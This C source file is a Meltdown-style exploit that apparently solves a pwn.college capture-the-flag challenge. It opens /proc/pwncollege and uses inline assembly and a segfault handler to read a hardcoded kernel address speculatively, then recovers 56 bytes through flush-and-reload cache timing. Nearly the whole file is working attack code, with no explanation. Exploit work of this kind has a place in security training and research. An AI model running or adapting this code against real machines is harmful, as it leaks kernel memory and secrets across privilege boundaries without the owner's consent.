// gcc meltdown.c -lrt -D_GNU_SOURCE -o melt-demo -masm=intel
#include <stdio.h>
#include <stdbool.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h>
#include <setjmp.h>
#include <sys/ioctl.h>

#define CACHE_HIT_THRESHOLD 150
#define CACHE_LINE_SIZE 0x1000
#define BUFF_SIZE 256
#ifdef __APPLE__
#define MAP_POPULATE 0
#endif


char *buffer;

/*
 * victim code
 *
 */

char *secret_page;

/*
 * exploit code
 *
 */

void speculative_exploit(int fd, size_t target_addr, char *com_buffer) {
    ioctl(fd, 0, 0);
    asm volatile(
			"xor rcx, rcx\n"
			"lea rbx, [%1]\n"
			"mov rax, 0x1337\n"
			"push rax\n"
			"fild QWORD PTR [rsp]\n"
			"fsqrt\n"
			"fistp QWORD PTR [rsp]\n"
			"pop rax\n"
			"mov rax, [rax]\n" // segfault
			"mov cl, BYTE PTR [%0]\n"
			"shl rcx, 12\n"
			"add rbx, rcx\n"
			"mov rbx, [rbx]\n"
			:
			: "r" (target_addr), "r" (com_buffer)
			: "rcx", "rbx", "rax"
		);
}

static jmp_buf buf;

static void segfault_handler(int signum) {
	(void)signum;
	sigset_t sigs;
	sigemptyset(&sigs);
	sigaddset(&sigs, signum);
	sigprocmask(SIG_UNBLOCK, &sigs, NULL);
	longjmp(buf, 1);
}

void pre_work() {
	uint8_t *addr;
	for (int j = 0; j < BUFF_SIZE; j++) {
		addr = buffer + j * CACHE_LINE_SIZE;
		_mm_clflush(addr);
	}
}

uint64_t time_access_no_flush(void *p) {
	uint64_t start, end;
	start = __rdtsc();
	volatile uint64_t x = *(volatile uint64_t*)p;
	_mm_mfence();
	end = __rdtsc();
	return end - start;
}

bool post_work_inner_work(int mix_i) {
	uint8_t *addr;
	size_t cache_hit_threshold = CACHE_HIT_THRESHOLD;
	int index;
	uint64_t t_no_flush;
	index = mix_i * CACHE_LINE_SIZE;
	addr = buffer + index;
	t_no_flush = time_access_no_flush(addr);
	if (t_no_flush < cache_hit_threshold) {
		return true;
	}
	return false;
}

int post_work(int *stats) {
	for (size_t i = 0; i < BUFF_SIZE; i++) {
		int mix_i = ((i * 167) + 13) & 255;
		if (post_work_inner_work(mix_i)) {
			stats[mix_i]++;
		}
	}
}

void *setup_mem() {
	return mmap(0, 255 * CACHE_LINE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
}

char *setup_secret() {
	char *page = mmap(0, 0x1000, PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
	strcpy(page, "secret_message");
	printf("secret_val: %s\n", page);
	printf("secret_addr: %p\n", &page);
	return page;
}
int exploit(size_t addr, int fd) {
	int stats[255] = {0};

	for (int j = 0; j < 100; j++) {
		if (!setjmp(buf)) {
			pre_work();
			speculative_exploit(fd, addr, buffer);
		}
		post_work(stats);
	}

	// Reviewing the stats data and print out the likely chars
	int max_index = 0;
	int max_value = 0;
	for (int j = 0; j < 255; j++) {
		if (j > 20 && stats[j] > max_value) {
			max_value = stats[j];
			max_index = j;
		}

	}

	printf("value detected: %c\n", max_index);
    return max_index;
}

int main(int argc, char **argv) {
	if (argc > 1) {
		if (signal(SIGSEGV, segfault_handler) == SIG_ERR) {
			printf("Failed to setup signal handler\n");
			exit(1);
		}

	}
    int fd = openat(AT_FDCWD, "/proc/pwncollege", O_RDWR);
	buffer = setup_mem();
	size_t secret = 0xffffffffc0002460; //setup_secret();

    char res[256] = {0};
	for (int i = 0; i < 56; i++) {
		res[i] = exploit(secret + i, fd);
	}
    printf("%s\n", res);
	return 0;
}
